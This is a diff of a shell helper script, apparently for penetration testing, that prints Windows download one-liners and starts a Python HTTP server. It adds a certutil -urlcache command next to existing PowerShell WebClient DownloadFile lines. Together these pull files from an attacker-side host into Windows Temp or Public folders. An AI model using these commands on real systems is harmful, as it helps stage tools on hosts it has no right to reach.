@@ -26,7 +26,10 @@ echo -e ""
 echo -e "${Frame}###${End} ${Title}Windows${End} ${Frame}###${End}"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$1','C:\\\Windows\\\Temp\\\\$1')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$1','C:\\\Users\\\Public\\\Documents\\\\$1')"
+echo -e "${Point} certutil -urlcache -f http://192.168.49.201:$port/$1 $1"
 echo -e ""
 
 # open http server
 sudo python3 -m http.server $port
+
+# 
